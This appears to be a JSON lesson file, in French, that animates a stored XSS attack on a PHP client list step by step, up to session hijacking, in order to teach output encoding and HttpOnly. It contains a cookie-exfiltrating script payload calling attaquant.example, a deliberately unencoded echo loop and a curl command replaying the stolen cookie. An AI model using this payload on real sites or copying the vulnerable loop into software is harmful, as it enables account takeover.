@@ -1,0 +1,199 @@
+{
+  "lecon": "xss",
+  "titre": "Déroulé d'une attaque XSS stockée — du champ piégé au vol de session",
+  "acteurs": [
+    { "id": "attaquant", "libelle": "Attaquant", "type": "attaquant" },
+    { "id": "application", "libelle": "Application web", "type": "serveur" },
+    { "id": "base", "libelle": "Base de données", "type": "stockage" },
+    { "id": "victime", "libelle": "Victime authentifiée", "type": "personne" },
+    { "id": "serveur-attaquant", "libelle": "Serveur de l'attaquant", "type": "serveur" }
+  ],
+  "etapes": [
+    {
+      "numero": 1,
+      "titre": "Le champ NOM reçoit une balise au lieu d'un nom",
+      "narration": "L'attaquant n'attaque pas le serveur : il utilise l'application exactement comme n'importe quel utilisateur. Il ouvre le formulaire « Modifier le client » du client n° 6 et, dans le champ NOM, il écrit une balise de script complète au lieu d'un nom. La démonstration de la séance 7 saisit ici alert(\"demo\"), qui ne fait que prouver l'exécution ; la simulation reprend l'un des usages que le cours nomme lui-même — voler le cookie et l'envoyer au pirate par une requête en arrière-plan. Rien n'est encore arrivé : la charge utile est simplement soumise.",
+      "etatVisuel": {
+        "acteurActif": "attaquant",
+        "fleche": {
+          "de": "attaquant",
+          "vers": "application",
+          "libelle": "POST modifier_client.php — client n° 6"
+        },
+        "panneaux": {
+          "attaquant": {
+            "texte": "PRENOM : Marc     NOM : <script>fetch('https://attaquant.example/collecte?c=' + document.cookie)</script>     COURRIEL : marc@exemple.invalide"
+          }
+        }
+      }
+    },
+    {
+      "numero": 2,
+      "titre": "L'enregistrement se fait par requête paramétrée",
+      "narration": "L'application enregistre la modification avec une requête parfaitement paramétrée : la valeur voyage dans un paramètre lié, jamais dans le texte SQL. Il n'y a donc AUCUNE injection SQL dans cette attaque, et c'est tout l'intérêt du module. Le paramétrage protège la base de données contre une donnée qui voudrait devenir une commande SQL ; il ne promet rien du tout sur ce qui arrivera à cette donnée plus tard, au moment de l'écrire dans une page HTML. Deux interpréteurs, deux parades, et celle-ci ne couvre que le premier.",
+      "etatVisuel": {
+        "acteurActif": "application",
+        "fleche": {
+          "de": "application",
+          "vers": "base",
+          "libelle": "UPDATE paramétré — aucune injection SQL"
+        },
+        "panneaux": {
+          "application": {
+            "code": "$stmt = $conn->prepare(\n    'UPDATE client SET prenom = ?, nom = ?, courriel = ? WHERE id_client = ?'\n);\n$stmt->bind_param('sssi', $prenom, $nom, $courriel, $id_client);\n$stmt->execute();",
+            "langage": "php"
+          }
+        }
+      }
+    },
+    {
+      "numero": 3,
+      "titre": "La base stocke la chaîne telle quelle",
+      "narration": "Le moteur de base de données fait son travail, et il le fait bien : il enregistre exactement la suite de caractères qu'on lui a remise, chevrons compris. Une base ne connaît pas le HTML — pour elle, cette valeur est du texte comme le serait « Tremblay ». Il n'y a aucune anomalie à journaliser, aucune alerte à lever, rien de suspect nulle part. La charge utile est maintenant persistée, et elle attend. C'est ce qui distingue le XSS stocké : l'attaquant peut fermer son navigateur, l'attaque continue sans lui.",
+      "etatVisuel": {
+        "acteurActif": "base",
+        "fleche": { "de": "base", "vers": "application", "libelle": "1 ligne modifiée" },
+        "panneaux": {
+          "base": {
+            "texte": "Ligne 6 — PRENOM : Marc · NOM : <script>fetch('https://attaquant.example/collecte?c=' + document.cookie)</script> · La valeur est stockée octet pour octet, chevrons compris."
+          }
+        }
+      }
+    },
+    {
+      "numero": 4,
+      "titre": "La victime ouvre la page de liste",
+      "narration": "Plus tard, une autre personne — une employée authentifiée, ici la gestionnaire des dossiers — ouvre simplement la liste des clients. Elle ne clique aucun lien piégé, elle ne reçoit aucun courriel de l'attaquant : elle fait son travail. Son navigateur joint automatiquement le cookie de session à la requête, comme il le fait pour toute requête vers un site où elle est connectée. Retiens ce point : dans un XSS stocké, la victime n'a rien à faire de particulier pour être atteinte.",
+      "etatVisuel": {
+        "acteurActif": "victime",
+        "fleche": {
+          "de": "victime",
+          "vers": "application",
+          "libelle": "GET liste_clients.php — le cookie de session part automatiquement"
+        },
+        "panneaux": {
+          "victime": {
+            "texte": "Session ouverte depuis ce matin. Cookie envoyé par le navigateur : PHPSESSID=8f2a4c1e9b7d3a06"
+          }
+        }
+      }
+    },
+    {
+      "numero": 5,
+      "titre": "L'application lit les clients en base",
+      "narration": "Pour construire la page, l'application demande à la base les colonnes de la liste. Cette requête n'a rien de fautif : elle est en lecture, elle est paramétrée ou n'a pas de paramètre du tout, et elle ne fait que ce qu'on attend d'elle. Il est important de le voir passer sans y chercher un coupable : la faute de cette histoire ne se trouve dans aucune des deux requêtes SQL, ni celle d'écriture ni celle de lecture.",
+      "etatVisuel": {
+        "acteurActif": "application",
+        "fleche": {
+          "de": "application",
+          "vers": "base",
+          "libelle": "SELECT sur la table des clients"
+        },
+        "panneaux": {
+          "application": {
+            "code": "SELECT ID_CLIENT, PRENOM, NOM, COURRIEL\nFROM client\nORDER BY ID_CLIENT;",
+            "langage": "sql"
+          }
+        }
+      }
+    },
+    {
+      "numero": 6,
+      "titre": "La valeur piégée revient du stockage",
+      "narration": "La base renvoie les six lignes, dont celle du client n° 6 avec son champ NOM piégé. À cet instant précis, la valeur est encore inoffensive : c'est une chaîne de caractères dans une variable PHP, rien de plus. Elle ne devient dangereuse que selon ce que le programme va en faire à la ligne suivante. C'est pourquoi la question utile en revue de code n'est jamais « d'où vient cette donnée ? » seule, mais « où atterrit-elle, et comment y est-elle écrite ? ».",
+      "etatVisuel": {
+        "acteurActif": "base",
+        "fleche": {
+          "de": "base",
+          "vers": "application",
+          "libelle": "6 lignes, dont la ligne piégée"
+        },
+        "panneaux": {
+          "base": {
+            "texte": "6 lignes renvoyées. Ligne 6, colonne NOM : la balise de script déposée à l'étape 1, intacte."
+          }
+        }
+      }
+    },
+    {
+      "numero": 7,
+      "titre": "Le HTML est construit par concaténation, sans encodage",
+      "narration": "Voici la faute, et elle tient à une seule ligne. La boucle d'affichage colle la valeur lue en base entre un <td> ouvrant et un </td> fermant, sans jamais la passer par htmlspecialchars(). Le serveur ne remarque rien : il assemble des octets entre d'autres octets, ce qui est exactement son travail. Mais l'information de provenance vient d'être perdue pour toujours — plus rien, dans le HTML produit, ne dira que ces quelques dizaines de caractères venaient d'un champ de formulaire. C'est la ligne que corrige la diapositive 29 du cours.",
+      "etatVisuel": {
+        "acteurActif": "application",
+        "surbrillance": ["application"],
+        "fleche": {
+          "de": "application",
+          "vers": "victime",
+          "libelle": "200 OK — la page contient une balise véritable"
+        },
+        "panneaux": {
+          "application": {
+            "code": "while ($ligne = $resultat->fetch_assoc()) {\n    $id_client = $ligne['ID_CLIENT'];\n    $prenom = $ligne['PRENOM'];\n    $nom = $ligne['NOM'];\n    echo \"<tr><td>\" . $id_client . \"</td><td>\" . $prenom . \"</td><td>\" . $nom . \"</td></tr>\";\n}",
+            "langage": "php"
+          }
+        }
+      }
+    },
+    {
+      "numero": 8,
+      "titre": "Le navigateur de la victime analyse une balise et l'exécute",
+      "narration": "Le navigateur de la victime reçoit le flux d'octets et applique sa grammaire : dès qu'un chevron ouvre une balise, c'est une balise. Il ouvre donc un élément de script et exécute son contenu, sans hésitation possible — il n'a aucun moyen de distinguer ce que le site a écrit de ce qu'un inconnu a dicté. L'inspecteur du navigateur donne la preuve structurelle que montre la diapositive 28 : la cellule ne contient pas le TEXTE de la charge, elle contient un ÉLÉMENT. Et ce script s'exécute dans l'origine du site : il a le DOM, les cookies sans HttpOnly et la session de la victime.",
+      "etatVisuel": {
+        "acteurActif": "victime",
+        "surbrillance": ["victime"],
+        "panneaux": {
+          "victime": {
+            "texte": "Cellule reçue : <td><script>fetch(...)</script></td> — dans l'inspecteur, un élément de script, pas un nœud de texte. Rien ne s'affiche à l'écran."
+          }
+        }
+      }
+    },
+    {
+      "numero": 9,
+      "titre": "Le cookie de session part en arrière-plan",
+      "narration": "Le script lit document.cookie et l'envoie au serveur de l'attaquant par une requête en arrière-plan. Regarde ce que la victime voit : rien. Aucune boîte de dialogue, aucune page qui change, aucun ralentissement. La liste des clients s'affiche normalement et la journée continue. C'est l'un des trois usages que le cours nomme explicitement — voler les cookies et les envoyer au pirate par une requête AJAX. L'attribut de cookie HttpOnly couperait précisément cette étape-ci, en retirant le cookie de document.cookie, et seulement celle-ci.",
+      "etatVisuel": {
+        "acteurActif": "victime",
+        "surbrillance": ["victime", "serveur-attaquant"],
+        "fleche": {
+          "de": "victime",
+          "vers": "serveur-attaquant",
+          "libelle": "Requête en arrière-plan, invisible pour la victime"
+        },
+        "panneaux": {
+          "victime": {
+            "code": "fetch('https://attaquant.example/collecte?c=' + document.cookie);",
+            "langage": "typescript"
+          },
+          "serveur-attaquant": {
+            "texte": "Reçu : c=PHPSESSID=8f2a4c1e9b7d3a06 — horodaté, depuis l'adresse IP de la victime."
+          }
+        }
+      }
+    },
+    {
+      "numero": 10,
+      "titre": "L'attaquant rejoue le cookie et devient la victime",
+      "narration": "L'attaquant place le cookie volé dans ses propres requêtes. Le serveur reconnaît une session valide et lui répond comme il répondrait à la victime : il ne voit pas une usurpation, il voit un identifiant de session qu'il a lui-même émis. Aucun mot de passe n'a été cassé, aucune faille de la base n'a été exploitée. Le point qui doit rester : la faute était une ligne d'affichage non encodée, et son coût est la session d'une autre personne. Un htmlspecialchars() à l'étape 7 aurait fait afficher la charge comme du texte, et cette étape-ci n'existerait pas.",
+      "etatVisuel": {
+        "acteurActif": "attaquant",
+        "surbrillance": ["attaquant", "application"],
+        "fleche": {
+          "de": "attaquant",
+          "vers": "application",
+          "libelle": "GET liste_clients.php avec le cookie volé"
+        },
+        "panneaux": {
+          "attaquant": {
+            "code": "curl -H 'Cookie: PHPSESSID=8f2a4c1e9b7d3a06' \\\n  https://clinique.example/liste_clients.php",
+            "langage": "bash"
+          },
+          "application": {
+            "texte": "Session valide : la page protégée est servie. Du point de vue du serveur, c'est la victime qui navigue."
+          }
+        }
+      }
+    }
+  ]
+}
